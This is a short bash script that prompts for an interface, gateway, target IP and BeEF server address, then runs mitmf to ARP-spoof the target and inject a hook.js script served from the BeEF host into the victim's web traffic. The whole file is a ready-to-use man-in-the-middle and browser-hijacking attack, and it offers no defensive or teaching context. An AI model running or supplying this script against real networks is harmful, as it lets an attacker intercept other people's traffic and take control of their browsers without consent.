#! /bin/bash

ifconfig
echo Please enter an interface to use, example /wlan1 eth0
read interface
echo Please enter your default gateway, example /192.168.1.1
read router
echo Please enter your target IP
read target
echo Please enter IP of machine running BeEF server
read beef

mitmf --spoof --arp -i $interface --gateway $router --target $target --inject --js-url http://$beef:3000/hook.js
